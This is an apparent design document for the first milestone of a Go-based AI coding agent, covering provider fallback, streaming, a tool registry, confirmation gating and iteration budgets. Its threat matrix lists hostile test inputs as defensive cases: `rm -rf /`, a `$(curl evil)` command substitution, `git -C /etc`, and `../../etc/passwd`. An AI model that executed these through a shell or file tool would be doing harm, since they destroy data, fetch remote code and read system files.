# Design: Milestone 1 — Core Agent Loop

## Technical Approach

Wire the empty hexagonal skeleton into a working agent loop: extend ports for streaming + multi-provider, implement a router with fallback, connect TUI ↔ Brain ↔ LLM, build a tool registry with shell/file/git modules, add confirmation gating, and enforce iteration budgets. Three phases map to three PRs under 400 lines each.

## Architecture Decisions

### Decision: Streaming via `io.Pipe` + goroutine

| Option | Tradeoff | Decision |
|--------|----------|----------|
| Channel-based tokens | Provider-specific backpressure | Rejected |
| `io.Pipe` reader | Universal, composable with `io.Copy` | **Chosen** |

Each adapter spawns a goroutine that writes SSE chunks into `io.PipeWriter`; the Brain reads from `io.PipeReader` and forwards tokens to the TUI via a `TokenChunk` message type.

### Decision: Router as decorator, not separate type

| Option | Tradeoff | Decision |
|--------|----------|----------|
| Standalone Router struct | Extra indirection | Rejected |
| Router implements `LLMProvider` | Transparent fallback, single interface | **Chosen** |

`Router` wraps `[]Provider` and iterates on error. Brain only knows `LLMProvider`.

### Decision: Tool registry as flat `map[string]Tool`

| Option | Tradeoff | Decision |
|--------|----------|----------|
| Module-scoped lookup (iterate all modules) | Current approach — O(n) scan, fragile | Rejected |
| Flat registry populated at init | O(1) lookup, clear ownership | **Chosen** |

Each `Module.Register(registry)` contributes its tools. Brain dispatches by name directly.

### Decision: Confirmation as middleware, not inline

| Option | Tradeoff | Decision |
|--------|----------|----------|
| Inline `if requiresConfirmation` (current) | Scattered, no per-tool state | Rejected |
| `ConfirmGuard` wrapping tool dispatch | Modes, per-session cache, headless override | **Chosen** |

`ConfirmGuard` holds mode + `map[string]bool` approved set. Brain calls `guard.ShouldConfirm(toolName)` before execution.

## Data Flow

```
TUI (Bubbletea)
  │ Enter key → tea.Cmd
  ▼
Brain.ProcessMessage(ctx, input)
  │ 1. Budget check (iteration < max)
  │ 2. ConfirmGuard.ShouldConfirm(tool)
  │ 3. Router.Chat/Stream(messages)
  ▼                    ▲
LLM Adapter ──SSE──▶ io.Pipe ──tokens──▶ TUI render
  │
  ▼ (tool_call in response)
ToolRegistry.Execute(name, args)
  │ path validation
  │ ConfirmGuard gate
  ▼
Module (shell/file/git) → Result → fed back as Tool message → loop
```

## File Changes

| File | Action | Description |
|------|--------|-------------|
| `internal/core/ports/ports.go` | Modify | Add `Stream()`, `TokenStream`, extend `Config` with `FallbackChain`, `Budget`, `TrustMode` |
| `internal/core/domain/models.go` | Modify | Add `TokenChunk`, `ToolResult.Success`, `TrustMode`, `BudgetConfig` types |
| `internal/adapters/llm/router.go` | Create | Fallback router implementing `LLMProvider` |
| `internal/adapters/llm/openai.go` | Create | OpenAI adapter with streaming |
| `internal/adapters/llm/anthropic.go` | Create | Anthropic adapter with streaming |
| `internal/adapters/llm/ollama.go` | Create | Ollama REST adapter with streaming |
| `internal/adapters/llm/copilot.go` | Modify | Refactor `CopilotClient` to implement new `Provider` port |
| `internal/core/kernel.go` | Modify | Add iteration budget loop, flat tool registry dispatch, streaming callback |
| `internal/core/registry.go` | Create | `ToolRegistry` — flat `map[string]Tool` with `Register`/`Execute` |
| `internal/core/guard.go` | Create | `ConfirmGuard` — 4 modes, per-session approval cache |
| `internal/modules/shell/shell.go` | Create | Shell module — command execution with allowlist |
| `internal/modules/file/file.go` | Create | File module — read/write/list with path validation |
| `internal/modules/git/git.go` | Create | Git module — status/log/diff |
| `internal/adapters/tui/tui.go` | Modify | Wire `ProcessMessage`, handle `TokenChunk` messages, `/trust` commands |
| `internal/adapters/db/sqlite.go` | Modify | Add `sessions` + `tool_results` tables, session-scoped history |
| `internal/config/config.go` | Modify | Load new config fields (fallback_chain, budget, trust_mode) |
| `cmd/gaia/main.go` | Modify | Wire Router → Brain → TUI, register modules |
| `.golangci.yml` | Create | Linter baseline |

## Interfaces / Contracts

```go
// ports.go — extended
type Provider interface {
    Chat(ctx context.Context, msgs []domain.Message, opts ...ChatOpt) (*domain.Message, error)
    Stream(ctx context.Context, msgs []domain.Message, opts ...ChatOpt) (io.ReadCloser, error)
    Tools() []domain.ToolDef
}

type TokenStream = io.ReadCloser // SSE-normalized token chunks

// registry.go
type ToolRegistry struct { /* map[string]Tool */ }
func (r *ToolRegistry) Register(mod ports.Module)
func (r *ToolRegistry) Execute(ctx context.Context, name string, args map[string]any) (*domain.ToolResult, error)

// guard.go
type ConfirmGuard struct { /* mode, approved set */ }
func NewConfirmGuard(mode domain.TrustMode, headless bool) *ConfirmGuard
func (g *ConfirmGuard) ShouldConfirm(toolName string) bool
func (g *ConfirmGuard) SetMode(mode domain.TrustMode)
```

## Testing Strategy

| Layer | What | Approach |
|-------|------|----------|
| Unit | Router fallback, budget counting, guard modes, path validation | Table-driven tests with mock providers/modules |
| Unit | Each adapter's SSE parsing | Recorded HTTP responses via `httptest.Server` |
| Integration | Brain loop with mock LLM + real registry | Wire mock provider returning tool_calls, verify iteration + dispatch |
| E2E | TUI → Brain → mock LLM | `teatest` with scripted input/output assertions |

## Threat Matrix

| Boundary | Min adversarial cases | Applicability | Design response | RED tests |
|----------|----------------------|---------------|-----------------|-----------|
| Shell command injection | `rm -rf /`, `$(curl evil)` | Applicable | Allowlist + ConfirmGuard gate + path validation | Test: blocked commands, path traversal rejection |
| Git repo selection | `git -C /etc`, relative escapes | Applicable | Cwd locked to project root, reject `..` escapes | Test: path outside allowlist rejected |
| File path traversal | `../../etc/passwd` | Applicable | `filepath.Abs` + prefix check against allowlist | Test: traversal paths rejected |
| Documentation-like paths | N/A — no executable classification | N/A | No file execution boundary | — |
| Commit/Push/PR state | N/A — no git write operations in M1 | N/A | Read-only git tools only | — |

## Migration / Rollout

No migration required. Each phase is an independent PR. Config gains new optional fields with sensible defaults (budget=25, trust=always, fallback_chain=[]).

## Open Questions

- [ ] Should `execute_code` refund apply only to a specific tool name or any code-execution module?
- [ ] Ollama endpoint URL — hardcoded `localhost:11434` or configurable?
